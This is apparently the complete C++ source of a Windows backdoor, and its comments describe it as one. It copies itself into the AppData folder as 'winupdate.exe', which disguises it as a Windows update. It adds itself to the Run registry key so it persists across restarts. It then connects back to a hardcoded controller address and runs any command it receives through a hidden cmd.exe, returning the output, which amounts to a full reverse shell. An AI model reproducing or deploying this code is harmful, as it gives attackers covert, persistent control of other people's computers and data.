#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <stdexcept>
#include <array>
#include <filesystem>
#include <codecvt>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

using namespace std;
namespace fs = std::filesystem;

const char* HOST = "127.0.0.1";
const int PORT = 65000;

string install_path;

/**
 * Function install : create the directory for the backdoor file and installs it there
 *
 * @param filename
 *
 */
void install(const char * filename) {
    char *AppDataPath = getenv("APPDATA");
    install_path = string(AppDataPath) + "\\WinUpdate";
    fs::create_directory(install_path);

    fs::path executablePath = fs::absolute(fs::path(filename));
    string installTarget = install_path + "\\winupdate.exe";

    try {
        fs::copy_file(executablePath, installTarget);
    }
    catch (std::exception &e) {
        cout << e.what();
    }
}


/**
 * Function launch_process : launch the backdoor in background mode
 *
 */
void launch_process() {
    // Initialization of the setting for the new procss
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Conversion to a vector (mutable)
    vector<char> cmdVec(install_path.begin(), install_path.end());
    cmdVec.push_back('\0');

    // Creation of the new process
    CreateProcess(
            nullptr,
            cmdVec.data(),
            nullptr,
            nullptr,
            FALSE,
            0, //A new console for this process will be created
            nullptr,
            install_path.c_str(), // Startup directory
            &si,
            &pi
    );
}


/**
 * Function add_to_startup : add the backdoor to the windows files that get launched on startup (so it will be persistent)
 *
 */
void add_to_startup() {

    // Gets the path of the backdoor
    char *app_data_path = std::getenv("APPDATA");
    install_path = string(app_data_path) + "\\WinUpdate\\winupdate.exe";
    wstring widestr(install_path.begin(), install_path.end());
    const wchar_t *executable_path = widestr.c_str();

    // Add it to Windows register keys
    HKEY hkey;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
    RegSetValueExW(hkey, L"winupdate", 0, REG_SZ, LPBYTE(executable_path), sizeof(executable_path) * wcslen(executable_path));
    RegCloseKey(hkey);
}

/**
 * Function called to execute a system command and return the output
 *
 */
string exec(const char * cmd) {

    // Creation of the command
    const char *cmd_path = (getenv("COMSPEC"));
    wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    wstring wideString = converter.from_bytes(cmd);
    wstring wCmdPath = converter.from_bytes(cmd_path);
    wstring full_cmd = wCmdPath + L" /c " + wideString;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = nullptr;

    HANDLE hReadPipe = nullptr, hWritePipe = nullptr;

    // Creation of the pipe to read the output
    CreatePipe(
            &hReadPipe,
            &hWritePipe,
            &saAttr,
            0);
    string output;

    STARTUPINFOW si = {};
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES,
    si.wShowWindow = SW_HIDE;
    si.hStdInput = INVALID_HANDLE_VALUE,
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = {};
    CreateProcessW(nullptr, (LPWSTR)full_cmd.c_str(), nullptr,
                   nullptr, TRUE, CREATE_NEW_CONSOLE, nullptr,
                   nullptr, &si, &pi);

    // Wait for the end of the child
    bool bProcessEnded = false;
    int counter = 0;
    while (!bProcessEnded && counter<100)
    {

        // Give some sleep (50 ms), so we won't waste 100% CPU.
        bProcessEnded = WaitForSingleObject( pi.hProcess, 50) == WAIT_OBJECT_0;
        counter++;

        // Even if process exited - we continue reading, if
        // there is some data available over pipe.
        for (;;)
        {
            char buf[1024];
            DWORD dwRead = 0;
            DWORD dwAvail = 0;

            if (!::PeekNamedPipe(hReadPipe, nullptr, 0, nullptr,
                                 &dwAvail, nullptr))
                break;

            if (!dwAvail) // No data available, return
                break;

            if (!::ReadFile(hReadPipe, buf, sizeof(buf) - 1, &dwRead,
                            nullptr) || !dwRead)
                // Error, the child process might end
                break;

            buf[dwRead] = 0;
            output += buf;
        }
    }

    // Close all pipes
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return output;
}


/**
 * Function cmd : execute a given command and send the output to the socket
 *
 * @param sock is the socket the result will be sent to
 *
 */
void cmd(SOCKET sock) {
    char command[1024];
    string output;
    std::filesystem::path cwd;
    char cwd_char[1024];

    while (true) {
        cwd = fs::current_path();
        strcpy_s(cwd_char, cwd.string().c_str());
        send(sock, cwd_char, sizeof(cwd_char), 0);
        int bytesRead = recv(sock, command, sizeof(command), 0);
        if (bytesRead > 0) {
            command[bytesRead] = '\0';
            if (string(command)=="exit") break;
            else if (string(command).substr(0, 2)=="cd") {
                try {
                    cwd = string(command).substr(3, string(command).length() - 3);
                    fs::current_path(cwd);
                }
                catch (...) {
                    output = "The specified path is not correct or doesn't exist!";
                    send(sock, output.c_str(), output.size() + 1, 0);
                    Sleep(10);
                }
                string end = "END";
                send(sock, end.c_str(), end.size() + 1, 0);
            }
            else {
                output = exec(command);
                size_t positionDebut = 0;

                while (positionDebut < output.length()) {
                    std::string morceau = output.substr(positionDebut, 2048);
                    const char *buffer = morceau.c_str();
                    send(sock, buffer, strlen(buffer), 0);
                    positionDebut += 2048;
                    Sleep(100);
                }
                string end = "END";
                send(sock, end.c_str(), end.size() + 1, 0);
            }
        }
        else {
            return;
        }
    }
}

int main() {
    const char *systemRoot = std::getenv("SystemRoot");
    std::string system32Path = std::string(systemRoot) + "\\System32";
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    char *AppDataPath = std::getenv("APPDATA");
    string InstallPath = string(AppDataPath) + "\\WinUpdate";

    if (!fs::exists(InstallPath) && !fs::is_directory(InstallPath)) {
        install(__argv[0]);
        add_to_startup();

        return 0;
    }
    else if (fs::current_path().string()!=InstallPath && fs::current_path().string()!=system32Path) {
        launch_process();
        return 0;
    }

    // Initialization of Winsock
    while (true) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "Error while initialization of winsock." << std::endl;
            return 1;
        }
        SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Error while creating the client's socket." << std::endl;
            WSACleanup();
            return 1;
        }

        DWORD timeout = 300000;
        setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout);

        // Definition of server information
        sockaddr_in serverAddress{};
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_addr.s_addr = inet_addr(HOST);
        serverAddress.sin_port = htons(PORT);

        // Connection to the server
        if (connect(clientSocket, (struct sockaddr *) &serverAddress, sizeof(serverAddress)) != SOCKET_ERROR) {
            cmd(clientSocket);
        }

        closesocket(clientSocket);
        WSACleanup();
        Sleep(10000);
    }
}